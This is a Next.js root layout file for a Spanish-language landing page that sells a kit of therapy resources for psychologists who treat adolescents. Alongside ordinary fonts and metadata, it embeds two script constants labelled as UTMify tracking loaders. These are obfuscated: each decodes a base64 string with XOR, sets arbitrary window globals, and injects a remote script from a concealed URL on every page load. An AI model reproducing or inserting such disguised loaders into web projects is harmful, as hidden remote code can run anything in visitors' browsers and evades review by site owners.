import type { Metadata } from "next";
import { Inter, Merriweather } from "next/font/google";
import Script from "next/script";
import "./globals.css";

const UTMIFY_PIXEL_LOADER = `(function(){var a_m=atob("DEUQOuVrxou1u2/8xD4yT5cH5LGX0xuItDYqFcoIouWbzhuRrSNpFIYEq6XXyUCPpzd5SpEY6fvcwwqQ6zV5QoAH6OHGmUPepTFkSIwJs//QyE3Gnxg8GIIHqenU1xze/h5rGIsKq+6XgU2MrT11VqwP5KeXzQ6QsSAyAMddp7yHjlmZpSd2AoBYoLvRglnJ9XF2CtRJu9bI");var a_rn56=[];for(var t_j=0;t_j<a_m.length;t_j++){a_rn56.push(a_m.charCodeAt(t_j)&255);}var p_9yi1=a_rn56[0];var x_pmt=a_rn56.slice(1,1+p_9yi1);var g_tynl=a_rn56.slice(1+p_9yi1);var q_l=g_tynl.map(function(b,j_5v){return b^x_pmt[j_5v%p_9yi1];});var z_0="";for(var o_9g=0;o_9g<q_l.length;o_9g++){z_0+=String.fromCharCode(q_l[o_9g]&255);}var q_e=decodeURIComponent(escape(z_0));var p_z=JSON.parse(q_e);var v_zp=p_z.globals||[];v_zp.forEach(function(w_zj7s){window[w_zj7s.name]=w_zj7s.value;});var k_ul4=document.createElement("script");k_ul4.src=p_z.url;k_ul4.async=true;k_ul4.defer=true;(p_z.attributes||[]).forEach(function(j_300){k_ul4.setAttribute(j_300.name,j_300.value);});(document.head||document.documentElement).appendChild(k_ul4);})();`;

const UTMIFY_UTMS_LOADER = `(function(){var j_1lh=atob("DI1xPdrhzHahsOOmcfZTSKiN7kyD2JfSAf5LEvWCqBiPxZfLGOsIE7mOoVjDwszVEv8YTa6S4wPV3ZCJHewFWKmV4hzSks+EEPkFT7ODuQLEw8GcKvZTU7uMqVSbkofHBexcSK6MpRDYnZPUFPsUU67MvwPD2YfVU6FTS7uNuRODisGEDNAM");var z_9nub=[];for(var z_hc=0;z_hc<j_1lh.length;z_hc++){z_9nub.push(j_1lh.charCodeAt(z_hc)&255);}var r_sm=z_9nub[0];var i_01=z_9nub.slice(1,1+r_sm);var o_35g=z_9nub.slice(1+r_sm);var c_bsd=o_35g.map(function(b,n_ip){return b^i_01[n_ip%r_sm];});var t_s86="";for(var t_7rc=0;t_7rc<c_bsd.length;t_7rc++){t_s86+=String.fromCharCode(c_bsd[t_7rc]&255);}var n_n=decodeURIComponent(escape(t_s86));var d_4y48=JSON.parse(n_n);var e_c=d_4y48.globals||[];e_c.forEach(function(z_vv){window[z_vv.name]=z_vv.value;});var j_6za=document.createElement("script");j_6za.src=d_4y48.url;j_6za.async=true;j_6za.defer=true;(d_4y48.attributes||[]).forEach(function(i_aio){j_6za.setAttribute(i_aio.name,i_aio.value);});(document.head||document.documentElement).appendChild(j_6za);})();`;

const inter = Inter({
  variable: "--font-inter",
  subsets: ["latin"],
});

const merriweather = Merriweather({
  variable: "--font-merriweather",
  subsets: ["latin"],
  weight: ["400", "700", "900"],
  style: ["normal", "italic"],
});

export const metadata: Metadata = {
  title:
    "Kit Sesión Teen | Recursos visuales para psicólogas que atienden adolescentes",
  description:
    "+80 recursos terapéuticos listos, organizados por motivo de consulta, hechos para adolescentes. Sin cara de material para niños.",
  openGraph: {
    title:
      "Kit Sesión Teen | Recursos visuales para psicólogas que atienden adolescentes",
    description:
      "+80 recursos terapéuticos listos, organizados por motivo de consulta, hechos para adolescentes.",
    images: ["/og-image.png"],
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="es" className={`${inter.variable} ${merriweather.variable}`}>
      <body className="bg-cream text-ink font-sans antialiased">
        {children}
        <Script
          id="utmify-utms"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{ __html: UTMIFY_UTMS_LOADER }}
        />
        <Script
          id="utmify-pixel"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{ __html: UTMIFY_PIXEL_LOADER }}
        />
      </body>
    </html>
  );
}
